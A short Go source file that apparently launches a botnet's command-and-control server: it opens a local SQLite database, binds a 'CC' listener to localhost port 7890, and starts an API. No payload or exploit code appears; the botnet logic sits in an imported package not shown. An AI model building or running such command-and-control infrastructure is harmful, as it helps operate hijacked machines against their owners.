package main

import (
	"log"

	"github.com/rodzzlessa24/botnet"
	"github.com/rodzzlessa24/botnet/sqlite"
)

func main() {
	db, err := sqlite.Open("./cc.db")
	if err != nil {
		log.Panic(err)
	}
	defer db.Close()
	storage := &sqlite.Client{DB: db}

	c := botnet.NewCC("127.0.0.1", "7890", storage)

	go c.Listen()
	c.ListenAPI()
}
